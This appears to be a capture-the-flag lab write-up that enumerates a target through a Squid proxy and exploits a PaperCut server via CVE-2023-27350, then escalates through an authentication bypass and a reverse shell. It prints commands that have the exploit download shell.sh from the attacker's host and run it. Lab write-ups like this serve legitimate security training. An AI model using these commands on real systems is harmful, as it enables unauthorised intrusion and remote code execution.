# Enumeration
Post 22 
Port 3189 -- Squid

Using proxychains to add the squid proxy:
![](attachment/a81d3f8513eb141a1ee88c2b039447bc.png)
Then using squidscan to check open ports:
```
go mod tidy
go build
./squidscan
```

![](attachment/f9831a489448ba72f31da3fcf86a59f0.png)
We found 5 ports.
Using proxychains to do nmap scan:
![](attachment/5430aea28ba49c4fcae08e4a367158ae.png)

Now adding proxy in burpsuite:
![](attachment/31c0d8d5ae8545cc157289557a177d7b.png)

![](attachment/4c9f746c190237ef6f3009f7f06af819.png)

On port 9191:
![](attachment/6fcba4dfcbbccb05477c7b1b62bf8c6b.png)

Now we found a papercut exploit on github:
https://github.com/horizon3ai/CVE-2023-27350/tree/main

Using this:
```
proxychains python3 CVE-2023-27350.py -u http://10.10.82.145:9191 -c 'wget http://10.8.1.208/shell.sh' 

proxychains python3 CVE-2023-27350.py -u http://10.10.82.145:9191 -c 'chmod +x shell.sh'

proxychains python3 CVE-2023-27350.py -u http://10.10.82.145:9191 -c './shell.sh' 
```

Using linpeas there are writable e 
Now using authentication bypass:
https://www.exploit-db.com/exploits/51391
![](attachment/fd252b8d1a1797acbf53309ac9e57c74.png)


Now in enable printing: ![](attachment/90499d2df7b0301367be3e12d5302900.png)

When clicking refresh servers![](attachment/dd740ea9bd81c9e6e6957c1041e5f5e7.png)
In pspy64 we can see server-command get executed.

So editing it to get a reverse shell.![](attachment/daeeede0b9401aa846f4c3fbb639d59a.png)

![](attachment/4230e85a28825efa467a94dec116c006.png)